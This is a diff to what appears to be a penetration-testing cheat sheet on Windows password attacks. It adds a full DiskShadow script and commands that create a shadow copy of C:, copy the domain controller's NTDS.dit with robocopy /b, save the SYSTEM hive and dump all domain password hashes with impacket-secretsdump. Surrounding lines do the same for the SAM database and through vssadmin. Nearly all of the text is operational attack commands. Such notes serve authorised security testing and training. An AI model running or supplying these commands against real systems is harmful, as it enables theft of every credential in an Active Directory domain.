@@ -586,7 +586,7 @@ move sam.save \\<ip>\NameofFileShare
 # Uses Secretsdump.py to dump password hashes from the SAM database.
 python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
-( Next dump NTDS.dit need privilege Domain Admin)
+( Next dump NTDS.dit need privilege Domain Admin with vssadmin)
 
 # Uses Windows command line based tool vssadmin to create a volume shadow copy for C:. This can be used to make a copy of NTDS.dit safely.
 vssadmin CREATE SHADOW /For=C:
@@ -596,6 +596,40 @@ cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTD
 
 # Uses impacket-secretsdump to dump password hashes from the NTDS.dit by using 2 file NTDS.dit , system.save 
 impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
+
+( Next dump NTDS.dit need privilege SeBackupPrivilege and SeRestorePrivilege with DiskShadow)
+
+# Create script line to dump with Windows DiskShadow
+# type ine.txt
+
+set verbose on
+set metadata C:\Windows\Temp\meta.cab
+set context clientaccessible
+set context persistent
+begin backup
+add volume C: alias ine
+create
+expose %ine% E:
+end backup
+
+# Convert the script line endings to ensure compatibility with Windows DiskShadow
+unix2dos ine.txt
+
+# Create a volume shadow copy of the C: drive and mount it to bypass Active Directory file locks.
+diskshadow /s ine.txt
+
+# Extract the NTDS database file and the SYSTEM registry hive safely.
+robocopy /b e:\windows\ntds . ntds.dit
+reg save hklm\system system
+
+# Offline Credential Decryption (impacket-secretsdump)
+impacket-secretsdump -system system -ntds ntds.dit local
+
+
+
+
+
+
 ```
 ##### Linux Local Password Attacks
 ```
